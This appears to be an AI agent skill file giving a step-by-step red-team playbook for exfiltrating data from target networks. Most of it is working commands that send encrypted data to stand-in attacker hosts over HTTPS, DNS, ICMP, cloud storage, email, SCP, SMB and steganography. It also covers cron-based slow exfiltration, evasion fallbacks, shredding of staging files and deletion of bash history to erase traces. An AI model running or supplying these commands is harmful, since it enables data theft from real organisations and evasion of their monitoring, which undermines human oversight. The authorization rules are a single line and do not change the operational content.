---
name: exfiltration
description: Extract data from target networks through multiple channels including HTTP/S, DNS, ICMP, email, cloud services, and covert channels. Covers data packaging, encryption, transfer execution, verification, and cleanup.
---

# Exfiltration (TA0010)

## Overview
Exfiltration consists of techniques that adversaries use to steal data from the target network.
Once data is collected during post-exploitation, it must be packaged, encrypted, and transferred
to attacker-controlled infrastructure through available channels while evading detection.

This skill covers the full exfiltration lifecycle: channel assessment, data packaging,
transfer execution, verification, and cleanup.

## Scope Rules
1. All exfiltration requires explicit authorization with defined scope boundaries.
2. Minimize data transferred — prove capability with samples, not bulk dumps.
3. Encrypt all exfiltrated data in transit and at rest.
4. Log every transfer with timestamps, sizes, destinations, and methods used.
5. Clean up all staging artifacts after confirmed receipt.
6. Rate-limit transfers to avoid triggering volume-based alerts.

## Methodology

### Phase 1: Channel Assessment
Enumerate available exfiltration channels based on target environment:

1. **Network protocols:** Test outbound connectivity for HTTP/S, DNS, ICMP, SSH, SMB
2. **Email:** Check if SMTP is available (port 25/465/587)
3. **Cloud services:** Test reachability of S3, GDrive, Dropbox, Azure Blob, Pastebin
4. **Physical channels:** USB, Bluetooth, removable media (if physical access)
5. **Existing C2:** Leverage established command-and-control channels

Channel probe commands:
```bash
# Test outbound HTTP/S
curl -s -o /dev/null -w "%{http_code}" https://attacker.com/healthcheck

# Test DNS resolution to attacker domain
nslookup test.exfil.attacker.com

# Test ICMP outbound
ping -c 1 attacker_ip

# Test SSH outbound
ssh -o ConnectTimeout=5 -o BatchMode=yes attacker@ip echo "ok" 2>/dev/null

# Test SMTP outbound
nc -z -w5 smtp.target.com 25 && echo "SMTP open"

# Test SMB outbound
smbclient -L //attacker_ip -N 2>/dev/null && echo "SMB reachable"
```

### Phase 2: Data Packaging
Before exfiltration, data must be compressed, encrypted, and optionally encoded:

```bash
# 1. Compress data
tar -czf data.tar.gz /path/to/loot/

# 2. Encrypt with AES-256
openssl enc -aes-256-cbc -salt -pbkdf2 -in data.tar.gz -out data.enc -k "$PASSPHRASE"

# 3. Split into chunks (for chunked transfer)
split -b 512k data.enc chunk_

# 4. Base64 encode (for text-based channels like DNS)
base64 data.enc > data.b64

# 5. Hex encode (for DNS subdomain exfil)
xxd -p data.enc > data.hex
```

### Phase 3: Exfiltration Method Selection
Choose method based on the decision matrix:

| Factor          | HTTPS | DNS   | ICMP  | Cloud | Email | SCP   | SMB   | Stego |
|-----------------|-------|-------|-------|-------|-------|-------|-------|-------|
| Speed           | High  | Low   | Low   | High  | Med   | High  | High  | Low   |
| Stealth         | Med   | High  | Med   | Med   | Med   | Low   | Low   | High  |
| Max data size   | Large | Small | Small | Large | Med   | Large | Large | Small |
| Detection risk  | Med   | Low   | Med   | Med   | Med   | High  | High  | Low   |
| Requires auth   | No    | No    | No    | Yes   | Maybe | Yes   | Yes   | No    |

**Use HTTPS** when: Firewall allows outbound 443, moderate data size, blending with normal traffic.
**Use DNS** when: Strict egress filtering, small data, maximum stealth required.
**Use ICMP** when: DNS is monitored but ICMP is allowed, small data payloads.
**Use Cloud** when: Cloud services are trusted/whitelisted, large data volumes.
**Use Email** when: SMTP available, moderate data, low suspicion on email traffic.
**Use SCP/SFTP** when: SSH outbound allowed, large data, speed over stealth.
**Use Steganography** when: All channels monitored, hiding data in legitimate files.

### Phase 4: Execute Transfer

#### HTTPS Exfiltration (T1048.002)
```bash
# POST file to attacker web server
curl -X POST -H "Content-Type: application/octet-stream" -d @data.enc https://attacker.com/upload

# POST with wget
wget --post-file=data.enc https://attacker.com/upload -O /dev/null

# Chunked HTTPS upload with delays (T1030)
for chunk in chunk_*; do
    curl -s -X POST -d @"$chunk" https://attacker.com/upload/"$chunk"
    sleep $((RANDOM % 30 + 10))  # 10-40 second random delay
done
```

#### DNS Exfiltration (T1048.003)
```bash
# Encode data as hex and send as DNS subdomain queries
for line in $(xxd -p data.enc | fold -w 60); do
    nslookup "$line.exfil.attacker.com" >/dev/null 2>&1
    sleep $((RANDOM % 5 + 1))
done

# Using dnscat2 for interactive DNS tunnel
dnscat2 --dns "domain=exfil.attacker.com" --secret=shared_secret

# DNS TXT record exfil (query-response based)
dig +short TXT "$encoded_chunk.data.attacker.com"
```

#### ICMP Exfiltration (T1048.001)
```bash
# Send data embedded in ICMP packets
hping3 --icmp -d 1400 --file data.enc attacker_ip

# Python ICMP exfil (requires root)
python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
with open('data.enc','rb') as f:
    while chunk := f.read(1400):
        header = struct.pack('!BBHHH', 8, 0, 0, 1, 1)
        s.sendto(header + chunk, ('attacker_ip', 0))
"
```

#### Cloud Upload (T1567)
```bash
# AWS S3 (T1567.002)
aws s3 cp data.enc s3://attacker-bucket/loot/ --no-sign-request

# rclone to Google Drive / Dropbox / S3
rclone copy data.enc gdrive:loot/
rclone copy data.enc dropbox:loot/
rclone copy data.enc s3:attacker-bucket/loot/

# GitHub/GitLab (T1567.001)
git init loot && cd loot
cp ../data.enc .
git add . && git commit -m "update"
git remote add origin https://github.com/attacker/repo.git
git push -u origin main

# Pastebin / paste sites
curl -X POST -d "api_paste_code=$(base64 data.enc)" https://pastebin.com/api/api_post.php
```

#### Email Exfiltration (T1048)
```bash
# Using swaks (Swiss Army Knife for SMTP)
swaks --to attacker@mail.com --from user@target.com \
      --attach data.enc --server smtp.target.com --port 25

# Using sendmail/mailx
cat data.enc | base64 | mail -s "Report" attacker@mail.com

# Chunked email exfil
for chunk in chunk_*; do
    swaks --to attacker@mail.com --attach "$chunk" --server smtp.target.com
    sleep 300  # 5 min between emails
done
```

#### SCP/SFTP Transfer (T1041)
```bash
# SCP direct transfer
scp data.enc attacker@ip:/loot/

# SFTP batch transfer
sftp attacker@ip <<EOF
cd /loot
put data.enc
bye
EOF

# Rsync with bandwidth limit
rsync -avz --bwlimit=100 data.enc attacker@ip:/loot/
```

#### SMB Exfiltration
```bash
# Using smbclient
smbclient //attacker/share -U user%pass -c "put data.enc"

# Mount and copy
mount -t cifs //attacker/share /mnt/exfil -o user=attacker,pass=secret
cp data.enc /mnt/exfil/
umount /mnt/exfil
```

#### Steganography (T1027.003)
```bash
# steghide — embed in JPEG
steghide embed -cf cover_image.jpg -ef secret.txt -p "$PASSPHRASE"
steghide extract -sf cover_image.jpg -p "$PASSPHRASE"

# outguess — embed in JPEG
outguess -k "$PASSPHRASE" -d secret.txt cover.jpg stego.jpg

# OpenStego — embed in PNG
openstego embed -mf secret.txt -cf cover.png -sf stego.png -p "$PASSPHRASE"

# Exfil the stego image via normal channel (email, upload, social media)
curl -X POST -F "file=@stego.jpg" https://imgur.com/upload
```

#### Scheduled Transfer (T1029)
```bash
# Cron-based slow exfil over days
echo "0 3 * * * curl -s -X POST -d @/tmp/chunk_\$(date +\%j) https://attacker.com/upload" | crontab -

# Systemd timer for periodic exfil
# Create /etc/systemd/system/exfil.timer with OnCalendar=*-*-* 03:00:00
```

### Phase 5: Verification & Cleanup
```bash
# Verify receipt (callback from attacker server)
curl -s https://attacker.com/verify?job=exfil_001

# Clean up staging files
shred -vfz -n 3 data.tar.gz data.enc data.b64 data.hex chunk_*
rm -f data.tar.gz data.enc data.b64 data.hex chunk_*

# Clear bash history of exfil commands
history -d $(history | grep "curl\|scp\|exfil" | awk '{print $1}') 2>/dev/null

# Remove temp directories
rm -rf /tmp/staging /tmp/loot
```

## OPSEC Ratings Per Technique

| Technique | OPSEC | Detection Risk |
|-----------|-------|----------------|
| DNS exfil (dnscat2) | 🟢 Quiet | Low — blends with DNS traffic, but long TXT queries are anomalous |
| HTTPS POST upload | 🟡 Moderate | DLP may inspect, but encrypted traffic is normal |
| Steganography | 🟢 Quiet | Very low — data hidden in legitimate files |
| Cloud upload (S3/GDrive) | 🟡 Moderate | Cloud service traffic is normal, but volume may alert |
| SCP/SFTP direct | 🔴 Loud | SSH to external IP is highly visible |
| SMB exfil | 🔴 Loud | SMB to external IP is anomalous |
| Email (SMTP) | 🟡 Moderate | Email DLP may inspect attachments |
| ICMP tunnel | 🟡 Moderate | Large ICMP payloads are anomalous |
| Scheduled/slow exfil | 🟢 Quiet | Low volume over time avoids volume alerts |

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| HTTPS POST | Proxy blocks/inspects | Try DNS exfil, or use domain fronting with CDN |
| DNS exfil | DNS monitoring/blocking | Switch to HTTPS, try DoH (DNS over HTTPS) |
| SCP | SSH blocked outbound | Use HTTPS or DNS tunnel instead |
| Cloud upload | Cloud service blocked | Try lesser-known services (transfer.sh, file.io), or DNS |
| Email | DLP blocks attachment | Split into smaller chunks, base64 in body, use steganography |
| ICMP | ICMP blocked | Standard — try DNS or HTTPS instead |
| All channels blocked | Strict egress filtering | Physical exfil (USB), or use existing C2 channel |

## Technique Chaining Playbooks

### Stealthy Exfiltration Chain
```
1. Compress & encrypt data 🟢 (tar + openssl AES-256)
2. Split into small chunks 🟢 (split -b 512k)
3. DNS exfil with random delays 🟢 (10-40s between queries)
   └── DNS blocked? → Fall back to HTTPS POST with jitter
4. Verify receipt 🟢 (callback confirmation)
5. Cleanup staging artifacts 🟢 (shred + history clean)
```

### High-Volume Fast Exfil (Lab/Authorized)
```
1. Compress data 🟢 (tar + gzip)
2. Encrypt 🟢 (openssl AES-256)
3. SCP/rsync direct transfer 🔴
   └── Blocked? → Cloud upload (rclone to S3)
4. Verify integrity 🟢 (sha256sum compare)
5. Cleanup 🟢
```

## Examples
See [examples/dns-exfil-walkthrough.md](examples/dns-exfil-walkthrough.md) for DNS exfiltration workflow.
See [examples/https-chunked-upload.md](examples/https-chunked-upload.md) for chunked HTTPS exfil.
See [examples/data-packaging.md](examples/data-packaging.md) for encryption and packaging steps.

---

## Deep Dives
Load references when needed:
1. DNS exfiltration techniques: `references/dns_exfiltration.md`
2. HTTPS exfiltration techniques: `references/https_exfiltration.md`
3. Covert channel techniques: `references/covert_channels.md`
4. Data packaging and encryption: `references/data_packaging.md`
5. Detection avoidance strategies: `references/exfil_detection_avoidance.md`

## Evidence Collection
1. `exfil_channels.json` — available channels and connectivity test results
2. `data_inventory.json` — staged data with sizes, types, encryption status
3. `transfer_log.json` — every transfer with timestamps, method, size, destination
4. `verification.json` — receipt confirmations and integrity checks
5. `cleanup_log.json` — staging artifact removal confirmation

## Success Criteria
- Exfiltration channel identified and validated
- Data encrypted before transfer
- Transfer completed with receipt verification
- All staging artifacts cleaned up
- Transfer logged with full audit trail
- No detection alerts triggered during exfiltration
